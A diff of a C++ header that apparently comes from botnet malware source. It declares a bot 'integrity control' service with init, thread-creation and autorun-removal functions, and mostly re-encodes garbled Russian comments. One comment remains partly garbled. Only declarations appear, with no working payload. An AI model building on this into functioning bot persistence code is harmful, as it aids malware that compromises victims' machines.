@@ -1,5 +1,5 @@
 /*
-  РЎРµСЂРІСЃРё РєРѕРЅС‚СЂРѕР»СЏ С†РµР»СЊРЅРѕСЃС‚Рё Р±РѕС‚Р°.
+  Сервси контроля цельности бота.
 */
 #pragma once
 
@@ -8,29 +8,29 @@
 namespace CoreControl
 {
   /*
-    РРЅРёС†РёР°Р»РёР·Р°С†РёСЏ.
+    Инициализация.
   */
   void init(void);
 
   /*
-    Р”РµРёРЅРёС†РёР°Р»РёР·Р°С†РёСЏ.
+    Деинициализация.
   */
   void uninit(void);
 
   /*
-    РЎРѕР·РґР°РЅРёРµ РїРѕС‚РѕРєРѕРІ.
+    Создание потоков.
 
-    IN OUT group - РіСЂСѓРїРїР° РїРѕС‚РѕРєРѕРє, Рє РєРѕС‚РѕСЂРѕР№ Р±СѓРґСѓС‚ РїСЂРёРЅР°РґР»РµР¶Р°С‚СЊ РїРѕС‚РѕРєРё СЃРµСЂРІРёСЃР°.
+    IN OUT group - группа потокок, к которой будут принадлежать потоки сервиса.
     
-    Return       - true - РІ СЃР»СѓС‡Р°Рё СѓСЃРїРµС…Р°,
-                   false - РІ СЃР»СѓС‡Р°Рё РѕС€РёР±РєРё.
+    Return       - true - в случаи успеха,
+                   false - в случаи ошибки.
   */
   bool _create(ThreadsGroup::GROUP *group);
 
-  /*Р’В Р’В Р’В Р’В Clear all values РІР‚вЂ№РІР‚вЂ№from the system created by the bot to auto.
-Р’В Р’В Р’В Р’В 
-Р’В Р’В Р’В Р’В Return - true - if successful,
-Р’В Р’В Р’В Р’В Р’В Р’В Р’В Р’В Р’В Р’В Р’В Р’В Р’В false - if an error occurs.
-Р’В Р’В */
+  /*В В В В Clear all values вЂ‹вЂ‹from the system created by the bot to auto.
+В В В В 
+В В В В Return - true - if successful,
+В В В В В В В В В В В В В false - if an error occurs.
+В В */
   bool _removeAutorun(void);
 };
